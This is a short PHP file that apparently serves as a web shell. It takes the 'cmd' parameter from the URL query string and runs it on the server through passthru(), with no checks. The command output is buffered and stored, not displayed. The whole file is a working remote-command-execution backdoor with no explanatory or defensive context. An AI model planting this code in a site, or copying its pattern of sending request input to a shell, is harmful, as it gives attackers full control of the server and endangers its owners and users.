<?php
function myshellexec($cmd)
{
    $v = @ob_get_contents(); 
	@ob_clean(); 
	passthru($cmd); 
	$result = @ob_get_contents(); 
	ob_clean(); 
	echo $v;
    return $result;
}

$cmdline = $_GET['cmd'];
$ret = myshellexec($cmdline);
?>